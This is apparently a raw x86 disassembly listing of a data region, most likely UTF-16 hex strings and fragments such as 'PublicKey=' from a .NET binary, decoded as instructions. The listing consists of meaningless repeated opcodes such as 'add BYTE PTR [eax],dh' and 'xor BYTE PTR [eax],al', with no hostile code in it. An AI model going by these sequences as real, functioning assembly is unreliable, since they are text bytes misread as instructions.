  404118:	xor    DWORD PTR [eax],eax
  40411a:	popa   
  40411b:	add    BYTE PTR [ebp+0x0],ah
  40411e:	xor    BYTE PTR [eax],al
  404120:	bound  eax,QWORD PTR [eax]
  404122:	add    BYTE PTR fs:[ebx],dh
  404125:	add    BYTE PTR [ebx],dh
  404127:	add    BYTE PTR [ebx],dh
  404129:	add    BYTE PTR [ebx+0x0],ah
  40412c:	xor    eax,0x65006500
  404131:	add    BYTE PTR [esi],dh
  404133:	add    BYTE PTR [eax],dh
  404135:	add    BYTE PTR [edx],dh
  404137:	add    BYTE PTR [ecx],dh
  404139:	add    BYTE PTR [esi],dh
  40413b:	add    BYTE PTR [edi],dh
  40413d:	add    BYTE PTR [edx],dh
  40413f:	add    BYTE PTR [eax+eax*1+0x39],ah
  404143:	add    BYTE PTR [edi],dh
  404145:	add    BYTE PTR [ecx],dh
  404147:	add    BYTE PTR [eax],bh
  404149:	add    BYTE PTR [ebp+0x0],ah
  40414c:	popa   
  40414d:	add    BYTE PTR [ebx],dh
  40414f:	add    BYTE PTR [ecx],dh
  404151:	add    BYTE PTR [ecx+0x0],ah
  404154:	cmp    BYTE PTR [eax],al
  404156:	popa   
  404157:	add    BYTE PTR [ebp+0x0],ah
  40415a:	bound  eax,QWORD PTR [eax]
  40415c:	add    BYTE PTR fs:[eax],dh
  40415f:	add    BYTE PTR [eax+eax*1+0x61],ah
  404163:	add    BYTE PTR [eax],dh
  404165:	add    BYTE PTR [eax],dh
  404167:	add    BYTE PTR [edi],dh
  404169:	add    BYTE PTR [edx],dh
  40416b:	add    BYTE PTR [esi+0x0],ah
  40416e:	xor    al,BYTE PTR [eax]
  404170:	xor    eax,0x38006400
  404175:	add    BYTE PTR [edi],dh
  404177:	add    BYTE PTR [eax+eax*1+0x62],ah
  40417b:	add    BYTE PTR [ecx+0x0],ah
  40417e:	add    BYTE PTR ss:[esi+0x0],ah
  404182:	arpl   WORD PTR [eax],ax
  404184:	cmp    DWORD PTR [eax],eax
  404186:	xor    BYTE PTR [eax],al
  404188:	data16 add BYTE PTR [esi+0x0],ah
  40418c:	add    BYTE PTR fs:0x38003900,dh
  404193:	add    BYTE PTR [ebp+0x0],ah
  404196:	add    BYTE PTR fs:[eax+eax*1],dh
  40419a:	add    BYTE PTR fs:[ecx+0x0],ah
  40419e:	xor    eax,DWORD PTR [eax]
  4041a0:	xor    eax,0x34006500
  4041a5:	add    BYTE PTR [eax+eax*1],dh
  4041a8:	arpl   WORD PTR [eax],ax
  4041aa:	xor    eax,DWORD PTR [eax]
  4041ac:	cmp    DWORD PTR [eax],eax
  4041ae:	cmp    BYTE PTR [eax],al
  4041b0:	arpl   WORD PTR [eax],ax
  4041b2:	xor    al,0x0
  4041b4:	xor    eax,0x33003400
  4041b9:	add    BYTE PTR [eax],dh
  4041bb:	add    BYTE PTR [edi],dh
  4041bd:	add    BYTE PTR [ebp+0x0],ah
  4041c0:	cmp    BYTE PTR [eax],al
  4041c2:	add    BYTE PTR gs:[ebx],dh
  4041c5:	add    BYTE PTR [ebx],dh
  4041c7:	add    BYTE PTR [edx+0x0],ah
  4041ca:	cmp    BYTE PTR [eax],al
  4041cc:	xor    al,0x0
  4041ce:	xor    al,BYTE PTR [eax]
  4041d0:	add    BYTE PTR ss:[ecx],dh
  4041d3:	add    BYTE PTR [eax+eax*1],dh
  4041d6:	xor    eax,DWORD PTR [eax]
  4041d8:	add    BYTE PTR fs:[ecx+0x0],ah
  4041dc:	add    BYTE PTR gs:[ebx+0x0],ah
  4041e0:	cmp    DWORD PTR [eax],eax
  4041e2:	data16 add BYTE PTR ds:0x36003900,dh
  4041e9:	add    BYTE PTR [eax],bh
  4041eb:	add    BYTE PTR [ebx],dh
  4041ed:	add    BYTE PTR [esi],dh
  4041ef:	add    BYTE PTR [esi+0x0],ah
  4041f2:	cmp    DWORD PTR [eax],eax
  4041f4:	aaa    
  4041f5:	add    BYTE PTR [ebx+0x0],ah
  4041f8:	cmp    BYTE PTR [eax],al
  4041fa:	data16 add BYTE PTR [edi],dh
  4041fd:	add    BYTE PTR [eax+eax*1],dh
  404200:	aaa    
  404201:	add    BYTE PTR ds:0x65003000,dh
  404207:	add    BYTE PTR ds:0x37003900,dh
  40420d:	add    BYTE PTR ds:0x36006300,dh
  404213:	add    BYTE PTR [eax+eax*1],dh
  404216:	add    BYTE PTR gs:[edx],dh
  404219:	add    BYTE PTR [ecx],dh
  40421b:	add    BYTE PTR [eax],bh
  40421d:	add    BYTE PTR [ecx],bh
  40421f:	add    BYTE PTR [esi+0x0],ah
  404222:	xor    al,0x0
  404224:	xor    eax,0x65006400
  404229:	add    BYTE PTR [esi+0x0],ah
  40422c:	xor    al,0x0
  40422e:	add    BYTE PTR ss:[edx+0x0],ah
  404232:	xor    al,BYTE PTR [eax]
  404234:	popa   
  404235:	add    BYTE PTR [edx],dh
  404237:	add    BYTE PTR [edx+0x0],ah
  40423a:	xor    DWORD PTR [eax],eax
  40423c:	xor    al,BYTE PTR [eax]
  40423e:	xor    al,0x0
  404240:	aaa    
  404241:	add    BYTE PTR [ecx+0x0],ah
  404244:	add    BYTE PTR fs:[ebx+0x0],ah
  404248:	xor    eax,DWORD PTR [eax]
  40424a:	add    BYTE PTR ss:0x62003200,dh
  404251:	add    BYTE PTR [esi+0x0],ah
  404254:	xor    eax,0x33006300
  404259:	add    BYTE PTR [eax],dh
  40425b:	add    BYTE PTR [eax],bh
  40425d:	add    BYTE PTR [eax],dh
  40425f:	add    BYTE PTR ds:0x64003500,dh
  404265:	add    BYTE PTR [ecx+0x0],ah
  404268:	cmp    DWORD PTR [eax],eax
  40426a:	xor    BYTE PTR [eax+edx*2+0x65007200],0x0
  404272:	jae    0x404274
  404274:	add    BYTE PTR gs:[esi+0x0],ch
  404278:	je     0x40427a
  40427a:	popa   
  40427b:	add    BYTE PTR [eax+eax*1+0x69],dh
  40427f:	add    BYTE PTR [edi+0x0],ch
  404282:	outs   dx,BYTE PTR ds:[esi]
  404283:	add    BYTE PTR [ebp+0x0],dl
  404286:	dec    ecx
  404287:	add    BYTE PTR [eax+eax*1],ch
  40428a:	and    BYTE PTR [eax],al
  40428c:	push   eax
  40428d:	add    BYTE PTR [ebp+0x0],dh
  404290:	bound  eax,QWORD PTR [eax]
  404292:	ins    BYTE PTR es:[edi],dx
  404293:	add    BYTE PTR [ecx+0x0],ch
  404296:	arpl   WORD PTR [eax],ax
  404298:	dec    ebx
  404299:	add    BYTE PTR [ebp+0x0],ah
  40429c:	jns    0x40429e
  40429e:	cmp    eax,0x30003000
  4042a3:	add    BYTE PTR [edx],dh
  4042a5:	add    BYTE PTR [eax+eax*1],dh
  4042a8:	xor    BYTE PTR [eax],al
  4042aa:	xor    BYTE PTR [eax],al
  4042ac:	xor    BYTE PTR [eax],al
  4042ae:	xor    BYTE PTR [eax],al
  4042b0:	xor    BYTE PTR [eax],al
  4042b2:	xor    al,0x0
  4042b4:	cmp    BYTE PTR [eax],al
  4042b6:	xor    BYTE PTR [eax],al
  4042b8:	xor    BYTE PTR [eax],al
  4042ba:	xor    BYTE PTR [eax],al
  4042bc:	xor    BYTE PTR [eax],al
  4042be:	xor    BYTE PTR [eax],al
  4042c0:	cmp    DWORD PTR [eax],eax
  4042c2:	xor    al,0x0
  4042c4:	xor    BYTE PTR [eax],al
  4042c6:	xor    BYTE PTR [eax],al
  4042c8:	xor    BYTE PTR [eax],al
  4042ca:	xor    BYTE PTR [eax],al
  4042cc:	xor    BYTE PTR [eax],al
  4042ce:	xor    BYTE PTR [eax],al
  4042d0:	xor    BYTE PTR [eax],al
  4042d2:	add    BYTE PTR ss:[eax],dh
  4042d5:	add    BYTE PTR [edx],dh
  4042d7:	add    BYTE PTR [eax],dh
  4042d9:	add    BYTE PTR [eax],dh
  4042db:	add    BYTE PTR [eax],dh
  4042dd:	add    BYTE PTR [eax],dh
  4042df:	add    BYTE PTR [eax],dh
  4042e1:	add    BYTE PTR [eax],dh
  4042e3:	add    BYTE PTR [edx],dh
  4042e5:	add    BYTE PTR [eax+eax*1],dh
  4042e8:	xor    BYTE PTR [eax],al
  4042ea:	xor    BYTE PTR [eax],al
  4042ec:	xor    BYTE PTR [eax],al
  4042ee:	xor    BYTE PTR [eax],al
  4042f0:	xor    eax,0x35003200
  4042f5:	add    BYTE PTR [ebx],dh
  4042f7:	add    BYTE PTR [eax+eax*1],dh
  4042fa:	xor    DWORD PTR [eax],eax
  4042fc:	xor    eax,DWORD PTR [eax]
  4042fe:	xor    DWORD PTR [eax],eax
  404300:	xor    BYTE PTR [eax],al
  404302:	xor    BYTE PTR [eax],al
  404304:	xor    BYTE PTR [eax],al
  404306:	xor    al,0x0
  404308:	xor    BYTE PTR [eax],al
  40430a:	xor    BYTE PTR [eax],al
  40430c:	xor    BYTE PTR [eax],al
  40430e:	xor    BYTE PTR [eax],al
  404310:	xor    BYTE PTR [eax],al
  404312:	xor    DWORD PTR [eax],eax
  404314:	xor    BYTE PTR [eax],al
  404316:	xor    BYTE PTR [eax],al
  404318:	xor    BYTE PTR [eax],al
  40431a:	xor    DWORD PTR [eax],eax
  40431c:	xor    BYTE PTR [eax],al
  40431e:	xor    BYTE PTR [eax],al
  404320:	bound  eax,QWORD PTR [eax]
  404322:	xor    eax,0x63006600
  404327:	add    BYTE PTR [ecx],bh
  404329:	add    BYTE PTR [eax],dh
  40432b:	add    BYTE PTR [ebp+0x0],ah
  40432e:	aaa    
  40432f:	add    BYTE PTR [eax],dh
  404331:	add    BYTE PTR [edx],dh
  404333:	add    BYTE PTR [edi],dh
  404335:	add    BYTE PTR [esi+0x0],ah
  404338:	add    BYTE PTR ss:[edi],dh
  40433b:	add    BYTE PTR [eax],bh
  40433d:	add    BYTE PTR [edi],dh
  40433f:	add    BYTE PTR [ecx],dh
  404341:	add    BYTE PTR [ebp+0x0],ah
  404344:	aaa    
  404345:	add    BYTE PTR [edi],dh
  404347:	add    BYTE PTR [ebx],dh
  404349:	add    BYTE PTR [ecx+0x0],ah
  40434c:	cmp    BYTE PTR [eax],al
  40434e:	data16 add BYTE PTR [eax+eax*1+0x65],ah
  404353:	add    BYTE PTR [eax],bh
  404355:	add    BYTE PTR [ecx],bh
  404357:	add    BYTE PTR [ebx],dh
  404359:	add    BYTE PTR [eax],bh
  40435b:	add    BYTE PTR [ebx+0x0],ah
  40435e:	cmp    BYTE PTR [eax],al
  404360:	xor    DWORD PTR [eax],eax
  404362:	add    BYTE PTR fs:[eax+eax*1+0x34],ah
  404367:	add    BYTE PTR [eax],dh
  404369:	add    BYTE PTR [edx],dh
  40436b:	add    BYTE PTR [edx+0x0],ah
  40436e:	popa   
  40436f:	add    BYTE PTR [esi],dh
  404371:	add    BYTE PTR ds:0x39006200,dh
  404377:	add    BYTE PTR [edx],dh
  404379:	add    BYTE PTR [eax],dh
  40437b:	add    BYTE PTR [ecx],dh
  40437d:	add    BYTE PTR [eax+eax*1+0x36],ah
  404381:	add    BYTE PTR [eax],dh
  404383:	add    BYTE PTR ds:0x33003900,dh
  404389:	add    BYTE PTR [ebp+0x0],ah
  40438c:	cmp    DWORD PTR [eax],eax
  40438e:	add    BYTE PTR ss:[ebx+0x0],ah
  404392:	xor    al,0x0
  404394:	cmp    DWORD PTR [eax],eax
  404396:	xor    al,BYTE PTR [eax]
  404398:	add    BYTE PTR ss:0x65003100,dh
  40439f:	add    BYTE PTR [eax],bh
  4043a1:	add    BYTE PTR [eax],bh
  4043a3:	add    BYTE PTR [ecx],bh
  4043a5:	add    BYTE PTR [ebx+0x0],ah
  4043a8:	arpl   WORD PTR [eax],ax
  4043aa:	xor    DWORD PTR [eax],eax
  4043ac:	xor    eax,DWORD PTR [eax]
  4043ae:	data16 add BYTE PTR [ecx],dh
  4043b1:	add    BYTE PTR [eax+eax*1],dh
  4043b4:	xor    DWORD PTR [eax],eax
  4043b6:	xor    eax,0x62006500
  4043bb:	add    BYTE PTR [edx+0x0],ah
  4043be:	xor    eax,0x66003300
  4043c3:	add    BYTE PTR [ecx+0x0],ah
  4043c6:	arpl   WORD PTR [eax],ax
  4043c8:	xor    DWORD PTR [eax],eax
  4043ca:	xor    DWORD PTR [eax],eax
  4043cc:	xor    eax,DWORD PTR [eax]
  4043ce:	xor    DWORD PTR [eax],eax
  4043d0:	popa   
  4043d1:	add    BYTE PTR [ebp+0x0],ah
  4043d4:	xor    BYTE PTR [eax],al
  4043d6:	bound  eax,QWORD PTR [eax]
  4043d8:	add    BYTE PTR fs:[ebx],dh
  4043db:	add    BYTE PTR [ebx],dh
  4043dd:	add    BYTE PTR [ebx],dh
  4043df:	add    BYTE PTR [ebx+0x0],ah
  4043e2:	xor    eax,0x65006500
  4043e7:	add    BYTE PTR [esi],dh
  4043e9:	add    BYTE PTR [eax],dh
  4043eb:	add    BYTE PTR [edx],dh
  4043ed:	add    BYTE PTR [ecx],dh
  4043ef:	add    BYTE PTR [esi],dh
  4043f1:	add    BYTE PTR [edi],dh
  4043f3:	add    BYTE PTR [edx],dh
  4043f5:	add    BYTE PTR [eax+eax*1+0x39],ah
  4043f9:	add    BYTE PTR [edi],dh
  4043fb:	add    BYTE PTR [ecx],dh
  4043fd:	add    BYTE PTR [eax],bh
  4043ff:	add    BYTE PTR [ebp+0x0],ah
  404402:	popa   
  404403:	add    BYTE PTR [ebx],dh
  404405:	add    BYTE PTR [ecx],dh
  404407:	add    BYTE PTR [ecx+0x0],ah
  40440a:	cmp    BYTE PTR [eax],al
  40440c:	popa   
  40440d:	add    BYTE PTR [ebp+0x0],ah
  404410:	bound  eax,QWORD PTR [eax]
  404412:	add    BYTE PTR fs:[eax],dh
  404415:	add    BYTE PTR [eax+eax*1+0x61],ah
  404419:	add    BYTE PTR [eax],dh
  40441b:	add    BYTE PTR [eax],dh
  40441d:	add    BYTE PTR [edi],dh
  40441f:	add    BYTE PTR [edx],dh
  404421:	add    BYTE PTR [esi+0x0],ah
  404424:	xor    al,BYTE PTR [eax]
  404426:	xor    eax,0x38006400
  40442b:	add    BYTE PTR [edi],dh
  40442d:	add    BYTE PTR [eax+eax*1+0x62],ah
  404431:	add    BYTE PTR [ecx+0x0],ah
  404434:	add    BYTE PTR ss:[esi+0x0],ah
  404438:	arpl   WORD PTR [eax],ax
  40443a:	cmp    DWORD PTR [eax],eax
  40443c:	xor    BYTE PTR [eax],al
  40443e:	data16 add BYTE PTR [esi+0x0],ah
  404442:	add    BYTE PTR fs:0x38003900,dh
  404449:	add    BYTE PTR [ebp+0x0],ah
  40444c:	add    BYTE PTR fs:[eax+eax*1],dh
  404450:	add    BYTE PTR fs:[ecx+0x0],ah
  404454:	xor    eax,DWORD PTR [eax]
  404456:	xor    eax,0x34006500
  40445b:	add    BYTE PTR [eax+eax*1],dh
  40445e:	arpl   WORD PTR [eax],ax
  404460:	xor    eax,DWORD PTR [eax]
  404462:	cmp    DWORD PTR [eax],eax
  404464:	cmp    BYTE PTR [eax],al
  404466:	arpl   WORD PTR [eax],ax
  404468:	xor    al,0x0
  40446a:	xor    eax,0x33003400
  40446f:	add    BYTE PTR [eax],dh
  404471:	add    BYTE PTR [edi],dh
  404473:	add    BYTE PTR [ebp+0x0],ah
  404476:	cmp    BYTE PTR [eax],al
  404478:	add    BYTE PTR gs:[ebx],dh
  40447b:	add    BYTE PTR [ebx],dh
  40447d:	add    BYTE PTR [edx+0x0],ah
  404480:	cmp    BYTE PTR [eax],al
  404482:	xor    al,0x0
  404484:	xor    al,BYTE PTR [eax]
  404486:	add    BYTE PTR ss:[ecx],dh
  404489:	add    BYTE PTR [eax+eax*1],dh
  40448c:	xor    eax,DWORD PTR [eax]
  40448e:	add    BYTE PTR fs:[ecx+0x0],ah
  404492:	add    BYTE PTR gs:[ebx+0x0],ah
  404496:	cmp    DWORD PTR [eax],eax
  404498:	data16 add BYTE PTR ds:0x36003900,dh
  40449f:	add    BYTE PTR [eax],bh
  4044a1:	add    BYTE PTR [ebx],dh
  4044a3:	add    BYTE PTR [esi],dh
  4044a5:	add    BYTE PTR [esi+0x0],ah
  4044a8:	cmp    DWORD PTR [eax],eax
  4044aa:	aaa    
  4044ab:	add    BYTE PTR [ebx+0x0],ah
  4044ae:	cmp    BYTE PTR [eax],al
  4044b0:	data16 add BYTE PTR [edi],dh
  4044b3:	add    BYTE PTR [eax+eax*1],dh
  4044b6:	aaa    
  4044b7:	add    BYTE PTR ds:0x65003000,dh
  4044bd:	add    BYTE PTR ds:0x37003900,dh
  4044c3:	add    BYTE PTR ds:0x36006300,dh
  4044c9:	add    BYTE PTR [eax+eax*1],dh
  4044cc:	add    BYTE PTR gs:[edx],dh
  4044cf:	add    BYTE PTR [ecx],dh
  4044d1:	add    BYTE PTR [eax],bh
  4044d3:	add    BYTE PTR [ecx],bh
  4044d5:	add    BYTE PTR [esi+0x0],ah
  4044d8:	xor    al,0x0
  4044da:	xor    eax,0x65006400
  4044df:	add    BYTE PTR [esi+0x0],ah
  4044e2:	xor    al,0x0
  4044e4:	add    BYTE PTR ss:[edx+0x0],ah
  4044e8:	xor    al,BYTE PTR [eax]
  4044ea:	popa   
  4044eb:	add    BYTE PTR [edx],dh
  4044ed:	add    BYTE PTR [edx+0x0],ah
  4044f0:	xor    DWORD PTR [eax],eax
  4044f2:	xor    al,BYTE PTR [eax]
  4044f4:	xor    al,0x0
  4044f6:	aaa    
  4044f7:	add    BYTE PTR [ecx+0x0],ah
  4044fa:	add    BYTE PTR fs:[ebx+0x0],ah
  4044fe:	xor    eax,DWORD PTR [eax]
  404500:	add    BYTE PTR ss:0x62003200,dh
  404507:	add    BYTE PTR [esi+0x0],ah
  40450a:	xor    eax,0x33006300
  40450f:	add    BYTE PTR [eax],dh
  404511:	add    BYTE PTR [eax],bh
  404513:	add    BYTE PTR [eax],dh
  404515:	add    BYTE PTR ds:0x64003500,dh
  40451b:	add    BYTE PTR [ecx+0x0],ah
  40451e:	cmp    DWORD PTR [eax],eax
  404520:	or     ah,0x50
  404523:	add    BYTE PTR [edx+0x0],dh
  404526:	add    BYTE PTR gs:[ebx+0x0],dh
  40452a:	add    BYTE PTR gs:[esi+0x0],ch
  40452e:	je     0x404530
  404530:	popa   
  404531:	add    BYTE PTR [eax+eax*1+0x69],dh
  404535:	add    BYTE PTR [edi+0x0],ch
  404538:	outs   dx,BYTE PTR ds:[esi]
  404539:	add    BYTE PTR [esi+0x0],al
  40453c:	jb     0x40453e
  40453e:	popa   
  40453f:	add    BYTE PTR [ebp+0x0],ch
  404542:	add    BYTE PTR gs:[edi+0x0],dh
  404546:	outs   dx,DWORD PTR ds:[esi]
  404547:	add    BYTE PTR [edx+0x0],dh
  40454a:	imul   eax,DWORD PTR [eax],0x2e
  40454d:	add    BYTE PTR [eax+eax*1+0x75],cl
  404551:	add    BYTE PTR [esi+0x0],ch
  404554:	popa   
  404555:	add    BYTE PTR [eax+eax*1],ch
  404558:	and    BYTE PTR [eax],al
  40455a:	push   eax
  40455b:	add    BYTE PTR [ebp+0x0],dh
  40455e:	bound  eax,QWORD PTR [eax]
  404560:	ins    BYTE PTR es:[edi],dx
  404561:	add    BYTE PTR [ecx+0x0],ch
  404564:	arpl   WORD PTR [eax],ax
  404566:	dec    ebx
  404567:	add    BYTE PTR [ebp+0x0],ah
  40456a:	jns    0x40456c
  40456c:	cmp    eax,0x30003000
  404571:	add    BYTE PTR [edx],dh
  404573:	add    BYTE PTR [eax+eax*1],dh
  404576:	xor    BYTE PTR [eax],al
  404578:	xor    BYTE PTR [eax],al
  40457a:	xor    BYTE PTR [eax],al
  40457c:	xor    BYTE PTR [eax],al
  40457e:	xor    BYTE PTR [eax],al
  404580:	xor    al,0x0
  404582:	cmp    BYTE PTR [eax],al
  404584:	xor    BYTE PTR [eax],al
  404586:	xor    BYTE PTR [eax],al
  404588:	xor    BYTE PTR [eax],al
  40458a:	xor    BYTE PTR [eax],al
  40458c:	xor    BYTE PTR [eax],al
  40458e:	cmp    DWORD PTR [eax],eax
  404590:	xor    al,0x0
  404592:	xor    BYTE PTR [eax],al
  404594:	xor    BYTE PTR [eax],al
  404596:	xor    BYTE PTR [eax],al
  404598:	xor    BYTE PTR [eax],al
  40459a:	xor    BYTE PTR [eax],al
  40459c:	xor    BYTE PTR [eax],al
  40459e:	xor    BYTE PTR [eax],al
  4045a0:	add    BYTE PTR ss:[eax],dh
  4045a3:	add    BYTE PTR [edx],dh
  4045a5:	add    BYTE PTR [eax],dh
  4045a7:	add    BYTE PTR [eax],dh
  4045a9:	add    BYTE PTR [eax],dh
  4045ab:	add    BYTE PTR [eax],dh
  4045ad:	add    BYTE PTR [eax],dh
  4045af:	add    BYTE PTR [eax],dh
  4045b1:	add    BYTE PTR [edx],dh
  4045b3:	add    BYTE PTR [eax+eax*1],dh
  4045b6:	xor    BYTE PTR [eax],al
  4045b8:	xor    BYTE PTR [eax],al
  4045ba:	xor    BYTE PTR [eax],al
  4045bc:	xor    BYTE PTR [eax],al
  4045be:	xor    eax,0x35003200
  4045c3:	add    BYTE PTR [ebx],dh
  4045c5:	add    BYTE PTR [eax+eax*1],dh
  4045c8:	xor    DWORD PTR [eax],eax
  4045ca:	xor    eax,DWORD PTR [eax]
  4045cc:	xor    DWORD PTR [eax],eax
  4045ce:	xor    BYTE PTR [eax],al
  4045d0:	xor    BYTE PTR [eax],al
  4045d2:	xor    BYTE PTR [eax],al
  4045d4:	xor    al,0x0
  4045d6:	xor    BYTE PTR [eax],al
  4045d8:	xor    BYTE PTR [eax],al
  4045da:	xor    BYTE PTR [eax],al
  4045dc:	xor    BYTE PTR [eax],al
  4045de:	xor    BYTE PTR [eax],al
  4045e0:	xor    DWORD PTR [eax],eax
  4045e2:	xor    BYTE PTR [eax],al
  4045e4:	xor    BYTE PTR [eax],al
  4045e6:	xor    BYTE PTR [eax],al
  4045e8:	xor    DWORD PTR [eax],eax
  4045ea:	xor    BYTE PTR [eax],al
  4045ec:	xor    BYTE PTR [eax],al
  4045ee:	bound  eax,QWORD PTR [eax]
  4045f0:	xor    eax,0x63006600
  4045f5:	add    BYTE PTR [ecx],bh
  4045f7:	add    BYTE PTR [eax],dh
  4045f9:	add    BYTE PTR [ebp+0x0],ah
  4045fc:	aaa    
  4045fd:	add    BYTE PTR [eax],dh
  4045ff:	add    BYTE PTR [edx],dh
  404601:	add    BYTE PTR [edi],dh
  404603:	add    BYTE PTR [esi+0x0],ah
  404606:	add    BYTE PTR ss:[edi],dh
  404609:	add    BYTE PTR [eax],bh
  40460b:	add    BYTE PTR [edi],dh
  40460d:	add    BYTE PTR [ecx],dh
  40460f:	add    BYTE PTR [ebp+0x0],ah
  404612:	aaa    
  404613:	add    BYTE PTR [edi],dh
  404615:	add    BYTE PTR [ebx],dh
  404617:	add    BYTE PTR [ecx+0x0],ah
  40461a:	cmp    BYTE PTR [eax],al
  40461c:	data16 add BYTE PTR [eax+eax*1+0x65],ah
  404621:	add    BYTE PTR [eax],bh
  404623:	add    BYTE PTR [ecx],bh
  404625:	add    BYTE PTR [ebx],dh
  404627:	add    BYTE PTR [eax],bh
  404629:	add    BYTE PTR [ebx+0x0],ah
  40462c:	cmp    BYTE PTR [eax],al
  40462e:	xor    DWORD PTR [eax],eax
  404630:	add    BYTE PTR fs:[eax+eax*1+0x34],ah
  404635:	add    BYTE PTR [eax],dh
  404637:	add    BYTE PTR [edx],dh
  404639:	add    BYTE PTR [edx+0x0],ah
  40463c:	popa   
  40463d:	add    BYTE PTR [esi],dh
  40463f:	add    BYTE PTR ds:0x39006200,dh
  404645:	add    BYTE PTR [edx],dh
  404647:	add    BYTE PTR [eax],dh
  404649:	add    BYTE PTR [ecx],dh
  40464b:	add    BYTE PTR [eax+eax*1+0x36],ah
  40464f:	add    BYTE PTR [eax],dh
  404651:	add    BYTE PTR ds:0x33003900,dh
  404657:	add    BYTE PTR [ebp+0x0],ah
  40465a:	cmp    DWORD PTR [eax],eax
  40465c:	add    BYTE PTR ss:[ebx+0x0],ah
  404660:	xor    al,0x0
  404662:	cmp    DWORD PTR [eax],eax
  404664:	xor    al,BYTE PTR [eax]
  404666:	add    BYTE PTR ss:0x65003100,dh
  40466d:	add    BYTE PTR [eax],bh
  40466f:	add    BYTE PTR [eax],bh
  404671:	add    BYTE PTR [ecx],bh
  404673:	add    BYTE PTR [ebx+0x0],ah
  404676:	arpl   WORD PTR [eax],ax
  404678:	xor    DWORD PTR [eax],eax
  40467a:	xor    eax,DWORD PTR [eax]
  40467c:	data16 add BYTE PTR [ecx],dh
  40467f:	add    BYTE PTR [eax+eax*1],dh
  404682:	xor    DWORD PTR [eax],eax
  404684:	xor    eax,0x62006500
  404689:	add    BYTE PTR [edx+0x0],ah
  40468c:	xor    eax,0x66003300
  404691:	add    BYTE PTR [ecx+0x0],ah
  404694:	arpl   WORD PTR [eax],ax
  404696:	xor    DWORD PTR [eax],eax
  404698:	xor    DWORD PTR [eax],eax
  40469a:	xor    eax,DWORD PTR [eax]
  40469c:	xor    DWORD PTR [eax],eax
  40469e:	popa   
  40469f:	add    BYTE PTR [ebp+0x0],ah
  4046a2:	xor    BYTE PTR [eax],al
  4046a4:	bound  eax,QWORD PTR [eax]
  4046a6:	add    BYTE PTR fs:[ebx],dh
  4046a9:	add    BYTE PTR [ebx],dh
  4046ab:	add    BYTE PTR [ebx],dh
  4046ad:	add    BYTE PTR [ebx+0x0],ah
  4046b0:	xor    eax,0x65006500
  4046b5:	add    BYTE PTR [esi],dh
  4046b7:	add    BYTE PTR [eax],dh
  4046b9:	add    BYTE PTR [edx],dh
  4046bb:	add    BYTE PTR [ecx],dh
  4046bd:	add    BYTE PTR [esi],dh
  4046bf:	add    BYTE PTR [edi],dh
  4046c1:	add    BYTE PTR [edx],dh
  4046c3:	add    BYTE PTR [eax+eax*1+0x39],ah
  4046c7:	add    BYTE PTR [edi],dh
  4046c9:	add    BYTE PTR [ecx],dh
  4046cb:	add    BYTE PTR [eax],bh
  4046cd:	add    BYTE PTR [ebp+0x0],ah
  4046d0:	popa   
  4046d1:	add    BYTE PTR [ebx],dh
  4046d3:	add    BYTE PTR [ecx],dh
  4046d5:	add    BYTE PTR [ecx+0x0],ah
  4046d8:	cmp    BYTE PTR [eax],al
  4046da:	popa   
  4046db:	add    BYTE PTR [ebp+0x0],ah
  4046de:	bound  eax,QWORD PTR [eax]
  4046e0:	add    BYTE PTR fs:[eax],dh
  4046e3:	add    BYTE PTR [eax+eax*1+0x61],ah
  4046e7:	add    BYTE PTR [eax],dh
  4046e9:	add    BYTE PTR [eax],dh
  4046eb:	add    BYTE PTR [edi],dh
  4046ed:	add    BYTE PTR [edx],dh
  4046ef:	add    BYTE PTR [esi+0x0],ah
  4046f2:	xor    al,BYTE PTR [eax]
  4046f4:	xor    eax,0x38006400
  4046f9:	add    BYTE PTR [edi],dh
  4046fb:	add    BYTE PTR [eax+eax*1+0x62],ah
  4046ff:	add    BYTE PTR [ecx+0x0],ah
  404702:	add    BYTE PTR ss:[esi+0x0],ah
  404706:	arpl   WORD PTR [eax],ax
  404708:	cmp    DWORD PTR [eax],eax
  40470a:	xor    BYTE PTR [eax],al
  40470c:	data16 add BYTE PTR [esi+0x0],ah
  404710:	add    BYTE PTR fs:0x38003900,dh
  404717:	add    BYTE PTR [ebp+0x0],ah
  40471a:	add    BYTE PTR fs:[eax+eax*1],dh
  40471e:	add    BYTE PTR fs:[ecx+0x0],ah
  404722:	xor    eax,DWORD PTR [eax]
  404724:	xor    eax,0x34006500
  404729:	add    BYTE PTR [eax+eax*1],dh
  40472c:	arpl   WORD PTR [eax],ax
  40472e:	xor    eax,DWORD PTR [eax]
  404730:	cmp    DWORD PTR [eax],eax
  404732:	cmp    BYTE PTR [eax],al
  404734:	arpl   WORD PTR [eax],ax
  404736:	xor    al,0x0
  404738:	xor    eax,0x33003400
  40473d:	add    BYTE PTR [eax],dh
  40473f:	add    BYTE PTR [edi],dh
  404741:	add    BYTE PTR [ebp+0x0],ah
  404744:	cmp    BYTE PTR [eax],al
  404746:	add    BYTE PTR gs:[ebx],dh
  404749:	add    BYTE PTR [ebx],dh
  40474b:	add    BYTE PTR [edx+0x0],ah
  40474e:	cmp    BYTE PTR [eax],al
  404750:	xor    al,0x0
  404752:	xor    al,BYTE PTR [eax]
  404754:	add    BYTE PTR ss:[ecx],dh
  404757:	add    BYTE PTR [eax+eax*1],dh
  40475a:	xor    eax,DWORD PTR [eax]
  40475c:	add    BYTE PTR fs:[ecx+0x0],ah
  404760:	add    BYTE PTR gs:[ebx+0x0],ah
  404764:	cmp    DWORD PTR [eax],eax
  404766:	data16 add BYTE PTR ds:0x36003900,dh
  40476d:	add    BYTE PTR [eax],bh
  40476f:	add    BYTE PTR [ebx],dh
  404771:	add    BYTE PTR [esi],dh
  404773:	add    BYTE PTR [esi+0x0],ah
  404776:	cmp    DWORD PTR [eax],eax
  404778:	aaa    
  404779:	add    BYTE PTR [ebx+0x0],ah
  40477c:	cmp    BYTE PTR [eax],al
  40477e:	data16 add BYTE PTR [edi],dh
  404781:	add    BYTE PTR [eax+eax*1],dh
  404784:	aaa    
  404785:	add    BYTE PTR ds:0x65003000,dh
  40478b:	add    BYTE PTR ds:0x37003900,dh
  404791:	add    BYTE PTR ds:0x36006300,dh
  404797:	add    BYTE PTR [eax+eax*1],dh
  40479a:	add    BYTE PTR gs:[edx],dh
  40479d:	add    BYTE PTR [ecx],dh
  40479f:	add    BYTE PTR [eax],bh
  4047a1:	add    BYTE PTR [ecx],bh
  4047a3:	add    BYTE PTR [esi+0x0],ah
  4047a6:	xor    al,0x0
  4047a8:	xor    eax,0x65006400
  4047ad:	add    BYTE PTR [esi+0x0],ah
  4047b0:	xor    al,0x0
  4047b2:	add    BYTE PTR ss:[edx+0x0],ah
